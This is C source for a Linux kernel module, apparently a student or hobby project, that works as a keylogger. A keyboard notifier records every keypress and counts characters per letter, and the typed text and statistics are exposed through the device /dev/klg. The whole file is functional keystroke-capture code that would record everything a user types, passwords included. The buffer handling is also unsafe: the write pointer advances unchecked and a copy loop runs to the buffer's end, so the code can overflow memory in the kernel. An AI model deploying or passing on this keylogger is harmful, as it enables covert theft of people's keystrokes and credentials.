/* Necessary includes for device drivers */

#include <linux/kernel.h>
#include <asm/uaccess.h>

#include "klogger.h"

int klg_init(void) {
	int result;

	/* Registering device */
  	result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
  
	if (result < 0)
		return result;

	register_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);

	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 

	return 0;
}

void klg_exit(void) {
	/* Freeing the major number */
	unregister_chrdev(KLG_MAJOR, "klg");

	unregister_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	bptr = buffer;

	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");

}

int klg_open(struct inode *inode, struct file *filp) {

	printk(KERN_DEBUG "[Key logger]: Opening device\n");
	return 0;
}

ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 

	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");

	char* p = buffer;
	int bytes = 0;

	while(*p != '\0') {
		bytes++;
		p++;
	}

	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);

	if(bytes == 0 || *f_pos) return 0;

	int ret = copy_to_user(buf, buffer, bytes);

	if(ret) {
		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");
		return -EFAULT;
	}

	*f_pos = 1;

	return bytes;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if(code == KBD_KEYCODE && param->down) {
		if(param-> value == KEY_BACKSPACE) {
			if(bptr != buffer) {
				--bptr;
				*bptr = '\0';
			}
		}
		else {
			/**
			 * This is a valid character to log. 
			 * So log the character, produce the statistics,
			 * and then rewrite the intire output
			 */
			 
			char ch = get_ascii(param->value);
			if(ch != 'X') {
				//case, ch is not the default unknown character ('X')
				
				/**
				 * Increment the count in the int_table 
				 * This keeps track of how many of the character that has been seen.
				 * It is mirrored from the ch_table[] defined by the klg authors
				 */
				int i = 0;
				for(i = 0; i < 52; ++i) {
					if(ch == ch_table[i]) {
						//found it
						int_table[i]++;
						break; //dont have to look anymore
					}
				}
				
				/**
				 * Put the character into the read buffer. Again, the read buffer is 
				 * the buffer that everything the user types is read into. 
				 * The read buffer will then be written to the buffer (/dev/klg) after the
				 * statistics is written.
				 */ 
				*rdptr = ch;
				rdptr++; //go to the next index
				
				/**
				 * Initialize some useful variables.
				 * start_of_data is always the next open spot in buffer that can be written too. 
				 * index is the index in int_table and ch_table for the particular character
				 */ 
				int start_of_data = 0;
				int index = 0;
				
				//write "STATS". Unfortunatly, it is this ugly--I can't find a way around it. 
				buffer[start_of_data] = 'S'; start_of_data++; buffer[start_of_data] = 'T'; start_of_data++;
				buffer[start_of_data] = 'A'; start_of_data++; buffer[start_of_data] = 'T'; start_of_data++;
				buffer[start_of_data] = 'S'; start_of_data++; buffer[start_of_data] = '\n'; start_of_data++;
				
				//write the whole int_table[] to the buffer
				while(index < 52) {
					/**
					 * First check for characters that need a special representation. 
					 */ 
					if(ch_table[index] == '\t') {
						buffer[start_of_data] = '\\';
						start_of_data++;
						buffer[start_of_data] = 't';
						start_of_data++;
					} else if(ch_table[index] == '\n') {
						buffer[start_of_data] = '\\';
						start_of_data++;
						buffer[start_of_data] = 'n';
						start_of_data++;
					} else if(ch_table[index] == '\r') {
						buffer[start_of_data] = '\\';
						start_of_data++;
						buffer[start_of_data] = 'r';
						start_of_data++;
					} else {
						buffer[start_of_data] = ch_table[index];
						start_of_data++;
					}
					
					//next 4 lines are for making it pretty
					buffer[start_of_data] = ':';
					start_of_data++;
					buffer[start_of_data] = '\t';
					start_of_data++;
					
					/**
					 * write the number as a char string
					 * 
					 * First, getting the digits. Below is a sloppy method of doing it. 
					 * However, it gets the job done. I wasn't able to figure out how to do 
					 * a nice function to hide this away. 
					 */ 
					
					int digits = 1;
					int num = int_table[index];
					if(num < 10) digits = 1;
					else if(num < 100) digits = 2;
					else if(num < 1000) digits = 3;
					else if(num < 10000) digits = 4;
					else if(num < 100000) digits = 5;
					else if(num < 1000000) digits = 6;
					else if(num < 10000000) digits = 7;
					else if(num < 100000000) digits = 8;
					else if(num < 1000000000) digits = 9;
					else digits = 10;
					
					//string to hold the text representation of the number
					char numChar[digits];
					
					//converts integer into a c string and puts it in numChar
					sprintf(numChar, "%d", num);
					
					//write the c string numChar to the buffer
					for(i = 0; i < digits; ++i) {
							buffer[start_of_data] = numChar[i];
							start_of_data++;
					}
					//write a newline to make it look pretty
					buffer[start_of_data] = '\n';
					start_of_data++;
					index++;
				}
				
				//write a newline to make it look pretty
				buffer[start_of_data] = '\n';
				start_of_data++;
				
				
				//write "Data" label. Again, ugly but functional.
				buffer[start_of_data] = 'D'; start_of_data++; buffer[start_of_data] = 'A'; start_of_data++;
				buffer[start_of_data] = 'T'; start_of_data++; buffer[start_of_data] = 'A'; start_of_data++;
				buffer[start_of_data] = '\n'; start_of_data++;
				
				
				//write the readBuffer into the buffer
				for(i = 0; start_of_data < BUFF_LENGTH; ++i) {
					buffer[start_of_data] = readBuffer[i];
					start_of_data++;
				}
				//done. Woho!
			}
		}
	}
	return NOTIFY_OK;
}


MODULE_LICENSE("Dual BSD/GPL");

module_init(klg_init);
module_exit(klg_exit);
